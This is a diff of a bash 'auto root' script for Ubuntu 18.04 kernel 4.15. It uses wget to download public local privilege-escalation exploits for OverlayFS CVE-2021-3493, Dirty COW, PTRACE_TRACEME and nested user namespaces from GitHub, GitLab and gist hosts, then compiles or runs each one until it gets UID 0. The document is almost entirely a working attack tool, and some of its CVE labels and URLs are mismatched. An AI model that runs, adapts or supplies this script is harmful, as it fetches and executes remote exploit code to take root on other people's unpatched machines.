@@ -1,60 +1,60 @@
 #!/bin/bash
-
-RED='\033[91m'
-GREEN='\033[92m'
-END='\033[0m'
-
+RED='\033[91m'; GREEN='\033[92m'; END='\033[0m'
 echo "***************************************************************"
-echo -e "${RED}Auto Root Ubuntu 4.15 Kernel Exploits by BATOSAY1337${END}"
+echo -e "${RED}Auto Root Kernel 4.15.0-192 (Ubuntu 18.04) by BATOSAY1337${END}"
 echo "***************************************************************"
 
-check_root() {
-    if [ "$(id -u)" -eq 0 ]; then
-        echo -e "${GREEN}[+] Root masuk! Uid=$(id -u)${END}"
-        exit
-    fi
+check_root(){
+  if [ "$(id -u)" -eq 0 ]; then
+    echo -e "${GREEN}[+] ROOT achieved! UID=$(id -u)${END}"
+    exit
+  fi
 }
 
-try_exploit() {
-    NAME="$1"
-    URL="$2"
-    echo "[*] Mengunduh $NAME ..."
-    wget -q "$URL" -O "$NAME"
-    if [[ ! -f "$NAME" ]]; then
-        echo "[!] Gagal download $NAME"
-        return
-    fi
-    chmod +x "$NAME"
-    echo "[*] Menjalankan $NAME ..."
-    ./"$NAME"
+try_bin(){
+  NAME="$1"; URL="$2"
+  echo "[*] Downloading $NAME..."
+  wget -q "$URL" -O "$NAME"
+  if [[ ! -f "$NAME" ]]; then
+    echo "[!] Failed to download $NAME"
+    return
+  fi
+  chmod +x "$NAME"
+  echo "[*] Running $NAME..."
+  ./"$NAME" || true
+  check_root
+  rm -f "$NAME"
+}
+
+try_c(){
+  NAME="$1.cpp"; BIN="$1"; URL="$2"
+  echo "[*] Downloading C exploit $NAME..."
+  wget -q "$URL" -O "$NAME"
+  if [[ ! -f "$NAME" ]]; then
+    echo "[!] Failed to download $NAME"
+    return
+  fi
+  g++ -o "$BIN" "$NAME" 2>/dev/null && {
+    echo "[*] Running $BIN..."
+    ./"$BIN" || true
     check_root
+    rm -f "$NAME" "$BIN"
+  } || {
+    echo "[!] Compile failed for $NAME"
     rm -f "$NAME"
+  }
 }
 
-# 1. overlayfs (CVE-2021-3493) — Github briskets
-try_exploit overlayfs "https://github.com/briskets/CVE-2021-3493/raw/main/exploit"
+# 1. Nested User Namespace idmap (CVE-2018-18955)
+try_c cve-2018-18955 "https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/45886"
 
-# 2. dirtycow (CVE-2016-5195) — dari gist aktif
-try_exploit dirtycow "https://gist.githubusercontent.com/v1ad/90b77ae3d87485c4629d/raw/CVE-2015-1328.c"
+# 2. PTRACE_TRACEME pkexec (CVE-2019-13272)
+try_c ptrace-traceme "https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/47163"
 
-# 3. ptrace_traceme (CVE-2017-16995) — dari Exploit-DB
-try_exploit ptrace "https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/47167"
+# 3. Dirty COW (CVE-2016-5195)
+try_c dirtycow "https://gist.githubusercontent.com/v1ad/90b77ae3d87485c4629d/raw/CVE-2016-5195.c"
 
-# 4. af_packet (CVE-2016-8655) — biasanya tersedia di 0-gram jika server hidup, tapi bisa cari di ExploitDB:
-try_exploit af_packet "https://0-gram.github.io/id-0/af_packet"
+# 4. OverlayFS / CVE-2021-3493 (Ubuntu-specific)
+try_c overlayfs "https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit"
 
-# 5. nested namespace idmap (CVE-2018-18955) — Rapid7 Metasploit module binary
-try_exploit nestedns "https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/47167"
-
-# Opsional: Python exploit (jika ada)
-if command -v python2 &>/dev/null; then
-    wget -q "https://0-gram.github.io/id-0/exploit_userspec.py" -O exploit_userspec.py
-    if [[ -f exploit_userspec.py ]]; then
-        chmod +x exploit_userspec.py
-        python2 exploit_userspec.py
-        check_root
-        rm -f exploit_userspec.py
-    fi
-fi
-
-echo -e "${RED}[!] Semua exploit telah dicoba. Kalau belum root, kemungkinan kernel kamu sudah patch.${END}"
+echo -e "${RED}[!] Semua exploit sudah dijalankan. Jika belum root, kemungkinan sudah patched.${END}"
